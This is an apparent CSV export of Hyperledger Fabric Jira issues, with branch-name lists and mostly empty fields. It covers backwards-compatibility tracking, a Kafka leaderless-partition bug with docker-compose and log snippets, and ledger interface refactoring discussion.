regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Backwards compatibility non-determinism in validation tracking issue.,FAB-5999,20559,19633,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,jyellick,jyellick,31/Aug/17 11:08 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Jan/18 1:23 AM,,,,v1.1.0,,,,,,,,0,,,,,,,"All components, please link to this issue as a blocker if you have any new features or bug fixes which will alter the behavior of the transaction validation path.

For example, a new MSP Role which is understood only by version 1.1 fabric could cause a transaction to be flagged as invalid on a v1.0 peer while being flagged as valid on a v1.1 peer. This would cause a state DB fork which creates all sorts of problems like enabling double spending etc.

These issues should not be merged until there is a compatibility mechanism in place to make the validation deterministic across versions. If there is code which has already merged, please re-open the issue and add this as a blocker and make a note that the code has already been merged below.

*SUMMARY OF MERGED CAPABILITIES*

This section will provide a summary of 1.1 capabilities, which can be extended as new capabilities are merged. See /fabric/common/channelconfig code/api.go for the full list. Test suggestions are included.

 

*/Channel capabilities*
{noformat}
	// MSPVersion specifies the version of the MSP this channel must understand, including the MSP types
	// and MSP principal types.
	MSPVersion() msp.MSPVersion
{noformat}
To test, create policies (endorsement or otherwise) utilizing the new Node.OUs such as Org1.Peer, Org2.Client, Org3.Orderer, etc.

Additionally, test defining a network with identity mixer MSPs in the orderer consortium definition,then defining new channels.

 

*/Channel/Application capabilities*
{noformat}
	// ForbidDuplicateTXIdInBlock specifies whether two transactions with the same TXId are permitted
	// in the same block or whether we mark the second one as TxValidationCode_DUPLICATE_TXID
	ForbidDuplicateTXIdInBlock() bool
{noformat}
To test, set the batch count to be high for higher probability. Submit a tx with no readset (only write-set) and then without waiting, immediately resubmit it. You should see two txes in the block, the first marked valid and the second invalid. In v1.0, they would both be marked valid.

 

*/Channe/Orderer capabilities*
{noformat}
        // SetChannelModPolicyDuringCreate specifies whether the v1.0 undesirable behavior of setting the /Channel
	// group's mod_policy to """" should be fixed or not.
	SetChannelModPolicyDuringCreate() bool
{noformat}
Create a channel at v1.0, and use the `configtxgen -inspectBlock` to confirm that the `/Channel` group has an empty `mod_policy`. Do the same with the capability enabled, and see that this `mod_policy` now reads `Admins`
{noformat}
        // Resubmission specifies whether the v1.0 non-deterministic commitment of tx should be fixed by re-submitting
	// the re-validated tx.
	Resubmission() bool
{noformat}
This is internal to the orderer only, so is harder to test. But, submit a channel configuration while submitting a stream of txes. Ensure that no txes are lost.

 ",,daijianw,jyellick,kchristidis,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5921,,,,,,,FABC-525,FAB-5720,FAB-6080,FAB-5669,FAB-5668,FAB-5954,FAB-6859,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf0v:",,,,,,,,,,,,,,,,,,,,,,,daijianw,jyellick,kchristidis,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jan/18 1:23 AM;Clayton Sims;marking done per discussion with jason;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Backwards compatibility deterministic failure tracking issue,FAB-6000,20560,19633,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,jyellick,jyellick,31/Aug/17 11:13 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,09/Jan/18 1:23 AM,,,,,,,,,,,,0,,,,,,,"All components, please link to this issue as a blocker for v1.1 features/fixes which are not backwards compatible with v1.0.x, but which do not affect the transaction validation path.

For example, [enabling mutual TLS authentication for chaincodes|https://jira.hyperledger.org/browse/FAB-5406] will cause existing chaincodes to fail to start and will require that the chaincode is redeployed.  However, this simply prevents an endorsement, and has no possibility of forking the world state.

These issues should only be merged after consideration for an existing v1.0 migration path.  Issues may be closed, but establishing the link will enable us to document the incompatibilities as v1.1 releases.",,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf13:",,,,,,,,,,,,,,,,,,,,,,,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jan/18 1:24 AM;Clayton Sims;marking done per discussion with jason;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix MSP Directory path,FAB-6001,20563,16071,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,01/Sep/17 12:15 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,17/Nov/17 11:51 PM,,,,v1.0.0,,fabric-quality,,,,,,0,quality,,,,,,"Make the crypto-config path consistent across the scripts.
Add -b option with the MSPDir path in generating the configtx.yaml which is using the default path as of now.
Change the cryptogen build directory similar to configtxgen and make use of ""make cryptogen"".
Adding the crypto-config to srcMSPDir in json2yml.js to avoid mentioning crypto-config.",,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf1j:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"01/Sep/17 12:19 AM;suryalnvs;https://gerrit.hyperledger.org/r/#/c/13055/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
'Leaderless Partitions found' while setting up ZK-Kafka and Orderers in different machines,FAB-6002,20564,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,htyagi90,htyagi90,01/Sep/17 12:16 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,02/Sep/17 5:00 AM,,,,,,,,,,,,0,consensus,docker-swarm-mode,,,,,"Trying to setup a distributed ordering service using zk-kafka cluster. Following is the setup :
 1. 3 zookeeper, 3 kafka docker containers on first server. 
 2. 3 orderers , 1 Organisation with 3 peers on second server.

Using docker swarm to create an overlay network between the two machines. Following is a snippet of the docker-compose for the respective services:

zookeeper_i:
{code:java}
// zookeeper0:
    container_name: zookeeper0
    image: hyperledger/fabric-zookeeper:x86_64-1.0.0
    environment:
        - ZOO_MY_ID=1
        - ZOO_SERVERS=server.1=zookeeper0:2888:3888 server.2=zookeeper1:2888:3888 server.3=zookeeper2:2888:3888
    ports:
      - 2181
      - 2888
      - 3888

    networks:
      - b2b-net
      - b2b-bridge
{code}
kafka_i:

 
{code:java}
// # three Kafka Nodes 
  kafka0:
    image: hyperledger/fabric-kafka:x86_64-1.0.0
    container_name: kafka0
    environment:
      - KAFKA_LOG_RETENTION_MS=-1
      - KAFKA_MESSAGE_MAX_BYTES=103809024
      - KAFKA_REPLICA_FETCH_MAX_BYTES=103809024
      - KAFKA_BROKER_ID=0
      - KAFKA_ZOOKEEPER_CONNECT=zookeeper0:2181,zookeeper1:2181,zookeeper2:2181
      - KAFKA_UNCLEAN_LEADER_ELECTION_ENABLE=false
      - KAFKA_DEFAULT_REPLICATION_FACTOR=3
      - KAFKA_MIN_INSYNC_REPLICAS=2
      - KAFKA_ADVERTISED_HOST_NAME=9.167.110.93
      - KAFKA_ADVERTISED_PORT=32797
    ports:
      - 32797:9092
    depends_on:
      - zookeeper0
      - zookeeper1
      - zookeeper2
    links:
      - zookeeper0:zookeeper0
      - zookeeper1:zookeeper1
      - zookeeper2:zookeeper2
    networks:
      - b2b-net
      - b2b-bridge
{code}
KAFKA_ADVERTISED_HOST_NAME is the public IP of the machine hosting the kafka and zookeeper containers.

 

orderer_i :
{code:java}
// orderer0.example.com:
    container_name: orderer0.example.com
    image: hyperledger/fabric-orderer:x86_64-1.0.0
    environment:
      - ORDERER_GENERAL_LOGLEVEL=debug
      - ORDERER_GENERAL_LISTENADDRESS=0.0.0.0
      - ORDERER_GENERAL_GENESISMETHOD=file
      - ORDERER_GENERAL_GENESISFILE=/etc/hyperledger/configtx/genesis.block
      - ORDERER_GENERAL_LOCALMSPID=OrdererMSP
      - ORDERER_GENERAL_LOCALMSPDIR=/etc/hyperledger/msp/orderer0/msp
      - ORDERER_KAFKA_RETRY_SHORTTOTAL=30s
      - ORDERER_KAFKA_RETRY_LONGINTERVAL=10s
      - ORDERER_KAFKA_RETRY_LONGTOTAL=100s
      - ORDERER_KAFKA_VERBOSE=true
      - ORDERER_KAFKA_BROKERS=[9.167.110.93:32797,9.167.110.93:32800,9.167.110.93:32798]
{code}
The kafka brokers are in `IP:Port` notation, where IP is the public IP of the machine hosting the zookeeper-kafka containers, and the port is the forwarded port.

Following is a snippet of configtx.yaml under the OrdererDefaults section.
{code:java}
// Kafka:
        # Brokers: A list of Kafka brokers to which the orderer connects
        # NOTE: Use IP:port notation
        Brokers:
            - 9.167.110.93:32797
            - 9.167.110.93:32800
            - 9.167.110.93:32798
{code}
On inspecting the genesis block, and it corresponds to the above kafka broker(s) details.

Started the zoo-kafka containers first and then the orderers. But keep getting a SERVICE_UNAVAILABLE error on peer channel create.
 !Screen Shot 2017-08-31 at 11.01.21 AM.png|width=596,height=198!

On checking orderer logs, I see that there is a persistent message of ""found some partitions to be leaderless"". This shows up after the producer is setup successfully and the co-op CONNECT message is sent. Snippet of the orderer log is as follows:
{code:java}
// 2017-08-31 15:02:03.145 UTC [orderer/kafka] try -> DEBU 594 [channel: testchainid] Attempting to post the CONNECT message...
[sarama] 2017/08/31 15:02:03.146023 client.go:599: client/metadata fetching metadata for [testchainid] from broker 9.167.110.93:32800
[sarama] 2017/08/31 15:02:03.292812 client.go:610: client/metadata found some partitions to be leaderless
[sarama] 2017/08/31 15:02:03.292835 client.go:590: client/metadata retrying after 250ms... (3 attempts remaining)
[sarama] 2017/08/31 15:02:03.542941 client.go:599: client/metadata fetching metadata for [testchainid] from broker 9.167.110.93:32800
[sarama] 2017/08/31 15:02:03.689610 client.go:610: client/metadata found some partitions to be leaderless
[sarama] 2017/08/31 15:02:03.689628 client.go:590: client/metadata retrying after 250ms... (2 attempts remaining)
[sarama] 2017/08/31 15:02:03.939719 client.go:599: client/metadata fetching metadata for [testchainid] from broker 9.167.110.93:32800
[sarama] 2017/08/31 15:02:04.086501 client.go:610: client/metadata found some partitions to be leaderless
[sarama] 2017/08/31 15:02:04.086518 client.go:590: client/metadata retrying after 250ms... (1 attempts remaining)
[sarama] 2017/08/31 15:02:04.336627 client.go:599: client/metadata fetching metadata for [testchainid] from broker 9.167.110.93:32800
[sarama] 2017/08/31 15:02:04.484268 client.go:610: client/metadata found some partitions to be leaderless
2017-08-31 15:02:04.484 UTC [orderer/kafka] startThread -> CRIT 595 [channel: testchainid] Cannot post CONNECT message = kafka server: In the middle of a leadership election, there is currently no leader for this partition and hence it is unavailable for writes.
panic: [channel: testchainid] Cannot post CONNECT message = kafka server: In the middle of a leadership election, there is currently no leader for this partition and hence it is unavailable for writes.

goroutine 9 [running]:
panic(0xb31bc0, 0xc420944e30)
    /opt/go/src/runtime/panic.go:500 +0x1a1
github.com/hyperledger/fabric/vendor/github.com/op/go-logging.(*Logger).Panicf(0xc42019ff20, 0xc700bc, 0x2e, 0xc420948d20, 0x2, 0x2)
    /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/op/go-logging/logger.go:194 +0x127
github.com/hyperledger/fabric/orderer/kafka.startThread(0xc4208786c0)
    /opt/gopath/src/github.com/hyperledger/fabric/orderer/kafka/chain.go:159 +0xe57
created by github.com/hyperledger/fabric/orderer/kafka.(*chainImpl).Start
    /opt/gopath/src/github.com/hyperledger/fabric/orderer/kafka/chain.go:94 +0x3f
{code}
Kafka container logs show that zookeeper-kafka connection is setup correctly.

Kafka leaders should be elected automatically.","* Docker swarm
 * Orderer containers host  : RHEL 7.3
 * Zk-Kafka containers host : Ubuntu 16.04",htyagi90,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Sep/17 12:01 AM;htyagi90;Screen Shot 2017-08-31 at 11.01.21 AM.png;https://jira.hyperledger.org/secure/attachment/12007/Screen+Shot+2017-08-31+at+11.01.21+AM.png",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzwzhb:",,,,,,,,,,,,,,,,,,,,,,,htyagi90,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Sep/17 5:00 AM;htyagi90;got it working. the catch was removing the `kafka_advertised_host_name` and `kafka_advertised_port` from the kafka docker-compose settings and add port forwarding from the docker host to the kafka containers.

```port:
          xxxx:9092
```

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix hard-coded ChaincodeSpec Type,FAB-6004,20568,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,01/Sep/17 2:32 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,01/Feb/18 3:40 PM,,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,Use ChaincodeSpec_Type_value instead of hard-coded number.,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyf1z:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Sep/17 2:52 PM;baohua;https://gerrit.hyperledger.org/r/#/c/13075/;;;","01/Feb/18 3:40 PM;baohua;https://gerrit.hyperledger.org/r/17381;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix mis-uage of getCDSFromLSCC in endorser,FAB-6005,20569,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,baohua,baohua,baohua,01/Sep/17 5:07 PM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,,,,Future,,fabric-peer,,,,,,0,,,,,,,"The endorser.getCDSFromLSCC() actually get chaincode data from ledger, instead of get chaincode deployment spec.

There's already a GetCDSFromLSCC() method in core.chaincode package, which does the correct work.

Would suggest to rename it to getCDFromLedger(), as it calls GetChaincodeDataFromLSCC() from the core.chaincode package.",,baohua,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyf27:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Sep/17 5:24 PM;baohua;https://gerrit.hyperledger.org/r/#/c/13077/;;;","01/Oct/17 7:01 PM;mastersingh24;Target should be 1.1.  1.0.x releases should only include bugs, security fixes;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add prometheus reporter,FAB-6006,20570,15982,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,grapebaba,grapebaba,grapebaba,01/Sep/17 5:29 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,10/Oct/17 4:46 PM,,,,,,fabric-ci,,,,,,0,,,,,,,Add prometheus reporter,,grapebaba,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf2f:",,,,,,,,,,,,,,,,,,,,,,,grapebaba,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable peer to connect to more than one different ordering services ,FAB-6007,20571,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Hangyu_FJH,Hangyu_FJH,Hangyu_FJH,01/Sep/17 6:12 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,06/Sep/17 8:28 PM,v1.0.2,v1.1.0,,v1.1.0,,fabric-gossip,,,,,,1,gossip,,,,,,"It didn't go well when I tried the following use case.

There are two organization(A and B) which have already been running their own channels seperately(channelA and channelB) meaning that they have their own ordering system (ordererA and ordererB) and peers(peerA and PeerB). Now one day organization A wants to create a new channel C using its own orderering system with peerA and PeerB. PeerA joins the channel successully and starts to receive blocks from ordererA. the log shows that peerB joins successully, but actually peerB tries to send deliver request to ordererB instead of ordererA. The genesis block of channel C contains the info of ordererA but ignored by peerB.

 

After studying the code, I found out that when peer is asked to join a new channel, if it already belongs to a channel, despite of the orderer's information written in the genesis block it received, it still tries to connect to the orderer it first established connection with.　Since there is no information of channel C in ordererB, the error message of not being able to get block from ordererB keeps coming up. I think this situation should be improved.",,Hangyu_FJH,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Sep/17 6:11 PM;Hangyu_FJH;usercase.png;https://jira.hyperledger.org/secure/attachment/12012/usercase.png",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyf2n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,Hangyu_FJH,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Sep/17 4:24 PM;Hangyu_FJH;https://gerrit.hyperledger.org/r/#/c/13123/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable the idemix mspconfig to be integrated into a config block,FAB-6009,20573,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dubovitskaya,elli-androulaki,elli-androulaki,01/Sep/17 9:05 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,01/Nov/17 3:52 AM,,,,,,fabric-crypto,,,,,,0,,,,,,,"We need to have a user-friendly way to create a IdemixMSPConfig out of issuer credential, the same way we do for the FabricMSPConfig. 

This is to be used later on to feed config blocks. 

As soon as this capability is in, IdexmiMSP would be usable by Fabric nodes that run a version with Idemix MSP. 

Therefore, we indicate this item is blocked by FAB-5556.",,dubovitskaya,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-2005,,,,,,,,,"1|hzyf33:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,dubovitskaya,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Oct/17 8:39 AM;dubovitskaya;This item is implied by FAB-6367, FAB-6369, and FAB-6627;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation typos - Reconfiguring with configtxlator section content,FAB-6010,20574,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,luomin,pvrbharg,pvrbharg,01/Sep/17 10:37 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,02/Oct/17 9:49 PM,v1.0.2,,,v1.0.3,v1.1.0,fabric-docs,,,,,,0,Documentation,,,,,,"Please note - this is one JIRA issue to track few documentation inaccuracies. Thanks.

 

https://github.com/hyperledger/fabric/tree/master/examples/configtxupdate

 

script fabric/example/configtxupdate/bootstrap_batchsize/script.sh        <--    We have this in more than one place in the Git URL that should have ""examples"" instead in the path


fabric/example/configtxupdate/reconfigure_batchsize/                    <--    We have this path on the file system as ""reconfig_batchsize"" and needs fixing",,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf3b:",,,,,,,,,,,,,,,,,,,,,,,pvrbharg,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove the function 'GetHashedDataNsAndKeyHashStr' from interface privacyenabledstate.DB,FAB-6011,20575,15293,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,manish-sethi,manish-sethi,01/Sep/17 11:40 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,12/Sep/17 1:46 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"CR [https://gerrit.hyperledger.org/r/#/c/12669] moved the function `GetHashedDataNsAndKeyHashStr'` from the implementation to the interface.

This function would be meaningless for other implementations and hence limits the possible alternate implementations.

This should be fixed and instead the interface {color:#000000}BulkOptimizable should directly be implemented by the implementations of {color}privacyenabledstate.DB.",,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf3j:",,,,,,Sprint 13 - Ledger,Sprint 14  - Ledger,Sprint 15  - Ledger,,,,,,,,,,,,,,,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Sep/17 4:05 PM;Senthil1;LoadCommittedVersions() expects a set of compositeKeys which need to be loaded into a cache. In order to create those compositeKeys set, we need to parse the block to get the readSets (both public and hashed read sets) and then construct compositeKeys. In order to do this for hashed read sets from validator side, we need GetHashedDataNsAndKeyHashStr. Note that GetHashedDataNsAndKeyHashStr is used in validateKVReadHash to use GetVersion() directly. Hence, only by making privacyenabledstate.DB to implement BulkOptimizable is not adequate{color:#000000}. Correct me if I am wrong.
{color}

To remove GetHashedDataNsAndKeyHashStr from privacyenabledstate.DB, we need to do one of the following:

1. Move GetHashedDataNsAndKeyHashStr into util package with a few other local function defined in privacyenabledstate. Make privacyenabledstate.DB to implement the BulkOptimizable interface. Validator can construct the compositeKeys and call privacyenabledstate.DB.LoadCommittedVersions(). 


2. Pass validator internal block to privacyenablestate.DB (need to expose a new interface named LoadCommittedVersionsFromBlock()) instead of compositeKeys set so that validator need not to call GetHashedDataNsAndKeyHashStr. No need to make privacyenabledstate.DB implement BulkOptimizable.


3. Pass two arguments: statedb.CompositeKeys and privacyenabledstate.PvtCompositeKeys to privacyenablestate.DB (need to expose a new interface named LoadCommittedPubAndHashVersion()). No need to make privacyenabledstate.DB implement BulkOptimizable

In all the above 3 approaches, we need to rename GetValueHash defined in privacyenabledstate.DB to GetHashVersion() which can be used by validator during validation of hashed read set. 

[~manish-sethi] Do you have any preference on above approaches? Or any other approach in Mind? For me, approach 3 looks fine.;;;","04/Sep/17 4:06 PM;Senthil1;[~denyeart];;;","06/Sep/17 4:44 AM;manish-sethi;Yes, the approach 3 in your listing is what I had in mind. Approach 1. and 2. are not cleaner because, in these one layer assume some implementation level details about the other layers.

 

As far as implementing `LoadCommittedPubAndHashVersion` is concerned, you would better need corresponding {color:#000000}`ClearCachedVersions` {color}as well. A combination of these two functions is what I meant by the new version of `BulkOptimizable` that would be implemented by the `privacyenabledstate.DB`. Further, the implementation of `privacyenabledstate.BulkOptimizable` would leverage the functions in `statedb.BulkOptimizable` (Which already exists and would stay to be used by privacyenabledstate.DB).

 

But largely, we are in sync as you chose the approach 3. Let me look at the CR and comment there.;;;","06/Sep/17 6:33 AM;manish-sethi;[~Senthil1] Looked at the CR and I am good with the approach you had followed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
